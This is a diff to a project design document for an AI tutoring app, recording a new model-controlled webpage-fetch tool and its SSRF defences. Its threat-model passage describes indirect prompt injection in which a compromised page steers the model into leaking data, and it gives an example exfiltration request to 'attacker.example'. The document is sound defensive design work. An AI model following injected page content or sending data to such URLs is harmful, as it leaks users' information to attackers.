@@ -433,7 +433,7 @@ persistent memory across sessions.
 **Goal:** the unified engine's agentic and workflow modes.
 
 **Scope**
-- ☐ Tool registry; live/external-data tool; retrieval-as-tool — exposed as LangGraph tool nodes.
+- ☑ Tool registry; live/external-data tool; retrieval-as-tool — exposed as LangGraph tool nodes.
 - ☐ Unified engine exposing chat / agentic / workflow modes as composable LangGraph graphs.
 - ☐ First structured workflow graph (e.g., guided practice / worked-example walkthrough).
 
@@ -478,12 +478,47 @@ selected by need/tier.
 > graph slice, where a third matching-shape call site would make the extraction concrete rather
 > than speculative.
 >
-> **Still open in Phase 6:** the live/external-data tool (a "live lookup" tool over
-> `app/rag/fetch.py::default_fetch` is the likely primitive — no web-search integration exists),
-> the workflow mode + first structured workflow graph, and promoting `build_tools()`'s flat list to
-> a heavier `ToolSpec`/`ToolContext` registry once a second tool gives that shape a real second
-> caller. None of the three Phase 6 scope boxes above are checked yet — this slice covers part of
-> the first two.
+> **Still open after slice 1:** the live/external-data tool, and the workflow mode + first
+> structured workflow graph. Landed in slice 2 below.
+>
+> **Live/external-data tool landed (slice 2).** `app/rag/fetch.py::default_fetch` — the existing
+> primitive, used only by the learner-initiated URL-ingestion path — was left untouched; a new
+> `safe_fetch` was added alongside it specifically for **model-controlled** URLs, a categorically
+> higher-risk trust boundary (the model decides which URL to fetch based on conversation content
+> that can include text from untrusted sources — an ingested page, a `search_materials` hit).
+> `safe_fetch` requires every DNS-resolved address for the host to be public — via `ipaddress`'s
+> `.is_global` (paired with an explicit multicast exclusion), not a naive enumeration of
+> `.is_private`/`.is_loopback`/etc., which misses RFC 6598 CGNAT space (`100.64.0.0/10`) — and does
+> not follow redirects (a redirect to an internal address would bypass the pre-connect check; a
+> real content-type check, since `raise_for_status()` doesn't raise on 3xx). It checks the
+> DNS-resolved address, never the URL string, so decimal/octal IP-literal obfuscation
+> (`http://2130706433/`) is a non-issue regardless of encoding. **Accepted, documented gaps, not
+> fixed:** a DNS-rebinding TOCTOU window between the resolve-and-check and the actual httpx
+> connection (both the robots.txt request and the main request re-resolve independently); and —
+> important not to overclaim — this only blocks *internal* targets. It does **not** address
+> indirect-prompt-injection-driven exfiltration to a *public* attacker-controlled URL (a
+> compromised page's content could still direct the model to `GET http://attacker.example/log?…` —
+> a different, unmitigated risk category from SSRF).
+>
+> `app/agent/tools.py::fetch_webpage` wraps `safe_fetch`, extracting readable text via
+> `trafilatura` for HTML (reusing the same extractor `app/rag/adapters/html.py` uses, called
+> directly rather than through the full ingestion-adapter machinery — no chunking/storage needed
+> for a stateless one-shot tool call) and falling back to plain UTF-8 decode otherwise; binary
+> content types (image/audio/video, PDF, octet-stream) are refused explicitly rather than decoded
+> into token-wasting mojibake. Output capped by `fetch_webpage_max_chars` (default 6,000, same
+> cost/UX-bound idiom as `placement_light_test_size`). `build_tools()` gained an injectable
+> `fetch: Fetcher = safe_fetch` kwarg, mirroring `ingest_source(..., fetch: Fetcher =
+> default_fetch)`'s exact seam, so tests inject a canned fetcher with no live network. Unlike
+> `search_materials`, `fetch_webpage` needs no `session`/`llm`/`learner_id` — it's fully stateless.
+>
+> **`build_tools()`'s flat list still not promoted** to a heavier `ToolSpec`/`ToolContext`
+> registry — tool #2 has now arrived, but the actual motivating need (tier-gating, per-tool
+> context shape) still doesn't exist: `Learner` has no `tier` field, and "tier" elsewhere in this
+> codebase's docs means the age/persona rollout (MASTERPLAN: "MVP deliberately stays in the adult
+> tier"), not a feature-access system. YAGNI still holds.
+>
+> **Still open in Phase 6:** the unified engine's workflow mode + first structured workflow graph.
+> Two of the three Phase 6 scope boxes above remain unchecked.
 
 ---
 
